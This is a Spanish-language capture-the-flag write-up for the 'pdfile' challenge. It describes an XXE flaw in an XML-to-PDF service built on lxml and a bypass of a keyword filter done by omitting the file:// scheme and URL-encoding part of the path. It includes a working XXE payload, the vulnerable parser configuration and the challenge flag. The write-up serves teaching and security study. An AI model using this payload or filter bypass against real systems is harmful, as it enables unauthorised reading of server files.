# pdfile CTF — Wrap-up

**Clasificación**: CWE-611 — Improper Restriction of XML External Entity Reference (XXE)

## Resumen

Se identificó vulnerabilidad de XXE en un sistema que provee un servicio de conversión XML-to-PDF. La aplicación parsea `.pasx` con `lxml` habilitando resolución de entidades externas, permitiendo leer archivos arbitrarios del servidor. Un filtro de palabras clave bloquea `file` y `flag`, pero es bypasseable eliminando el protocolo e inyectando URL-encoding.

## Flag

[Código para conseguir la flag automáticamente](./script.py)
```
pascalCTF{y0u_l1k3d_xxe_1nject10ns?}
```

## Proceso

### 1. Análisis

La aplicación parsea archivos `.pasx` (XML) con `lxml` y `resolve_entities=True`, renderizando contenido en PDF. Filtro bloquea: `flag`, `file`, `etc`, `bash`, `proc`.

### 2. Vector de ataque

Código vulnerable:
```python
parser = etree.XMLParser(resolve_entities=True, no_network=False)
root = etree.fromstring(xml_content, parser=parser)

# Luego incorpora elementos en el PDF
<content>&xxe;</content>
```

### 3. Explotación

Se intentó XXE básico con `file:///app/fla%67.txt`, pero el filtro rechaza la palabra `file` en el XML. El bypass: usar ruta absoluta sin protocolo (`/app/fla%67.txt`). lxml interpreta automáticamente como ruta local y el filtro solo ve el string, no detecta `file://`.

Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
    <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
    <title>Testing</title>
    <author>Test</author>
    <year>2026</year>
    <isbn>123</isbn>
    <chapters>
        <chapter number="1">
            <title>Data</title>
            <content>&xxe;</content>
        </chapter>
    </chapters>
</book>
```

La flag se renderiza en el PDF en la sección `<content>`.
